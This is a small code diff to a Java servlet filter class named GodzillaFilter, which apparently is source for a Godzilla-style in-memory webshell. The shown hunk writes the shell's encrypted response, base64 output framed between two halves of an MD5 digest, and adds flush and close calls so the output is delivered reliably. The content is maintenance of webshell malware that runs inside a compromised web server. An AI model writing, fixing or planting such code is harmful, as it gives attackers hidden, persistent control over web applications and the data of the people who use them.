@@ -51,6 +51,8 @@ public class GodzillaFilter extends ClassLoader implements Filter {
                         writer.write(md5.substring(0, 16));
                         writer.write(base64Encode(this.x(arrOut.toByteArray(), true)));
                         writer.write(md5.substring(16));
+                        writer.flush();
+                        writer.close();
                     }
                 } catch (Throwable e) {
                     e.printStackTrace();
